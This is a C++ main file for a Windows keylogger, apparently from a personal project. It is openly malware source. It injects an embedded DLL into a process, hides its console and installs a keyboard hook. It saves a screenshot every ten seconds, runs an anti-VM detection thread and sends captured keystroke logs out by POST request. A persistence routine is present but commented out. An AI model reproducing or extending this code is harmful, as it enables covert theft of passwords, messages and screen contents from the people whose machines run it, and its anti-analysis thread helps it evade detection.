#include <iostream>
#include <windows.h>
#include <thread>
#include "../include/key_hook.h"
#include "../include/Screenshot.h"
#include "../include/anti_eyes.h"
#include "../include/stealth.h"
#include "../include/post_request.h"
#include "../include/inject.h"


// Thread function for capturing screenshots
DWORD WINAPI screenshot_thread(LPVOID lpParam) {
    WCHAR filePath[] = L"C:\\Users\\kolby\\source\\repos\\KolbySnider\\Keylogger2\\out\\build\\x64-release\\screenshot.bmp";

    while (true) {
        save_bitmap(filePath); // Capture and save the screenshot
        Sleep(10000);         // Sleep for 10 seconds (10000 milliseconds)
    }

    return 0;
}

DWORD WINAPI detect_process_thread(LPVOID lpParam) {
    while (true) {
        detect_process(NULL);
        Sleep(10000);
    }
}

DWORD WINAPI post_thread(LPVOID lpParam) {
    while (true) {
        Sleep(10000); // (10 seconds)

        std::vector<char> logs_to_send;
        {
            std::lock_guard lock(g_logMutex);
            if (g_plainLogs.empty()) continue;
            logs_to_send.swap(g_plainLogs);
        }

        if (!send_via_post(logs_to_send)) {
            // If failed, put logs back
            std::lock_guard lock(g_logMutex);
            g_plainLogs.insert(g_plainLogs.end(), logs_to_send.begin(), logs_to_send.end());
        }
    }
    return 0;
}

int main() {
    std::string dllPath = extract_embedded_dll();
    DWORD pid = get_process_id_by_name(L"key_logger");
    if (pid != 0) inject_dll(pid, dllPath.c_str());

    hide_console();
    //persistence();

    install_hook(); // Install the key hook


    HANDLE hPostThread = CreateThread(
        NULL, // default security attributes
        0, // default stack size
        post_thread, // thread function for email
        NULL, // argument to thread function
        0, // default creation flags
        NULL); // returns the thread identifier

    if (hPostThread == NULL) {
        std::cerr << "Failed to create POST request thread." << std::endl;
        return 1;
    }

    HANDLE hScreenshotThread = CreateThread(
        NULL,            // default security attributes
        0,               // default stack size
        screenshot_thread, // thread function for screenshots
        NULL,            // argument to thread function
        0,               // default creation flags
        NULL);           // returns the thread identifier

    if (hScreenshotThread == NULL) {
        std::cerr << "Failed to create screenshot thread." << std::endl;
        return 1;
    }

    HANDLE hdetectProcessThread = CreateThread(
        NULL, // default security attributes
        0, // default stack size
        detect_process_thread, // thread function for screenshots
        NULL, // argument to thread function
        0, // default creation flags
        NULL); // returns the thread identifier


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up the hooks and threads
    uninstall_hook();
    WaitForSingleObject(hScreenshotThread, INFINITE); // Ensure screenshot thread finishes
    WaitForSingleObject(hdetectProcessThread, INFINITE); // Ensure Anti-VM thread finishes
    WaitForSingleObject(hPostThread, INFINITE);

    // Close thread handles
    CloseHandle(hScreenshotThread);
    CloseHandle(hdetectProcessThread);
    CloseHandle(hPostThread);

    return 0;
}
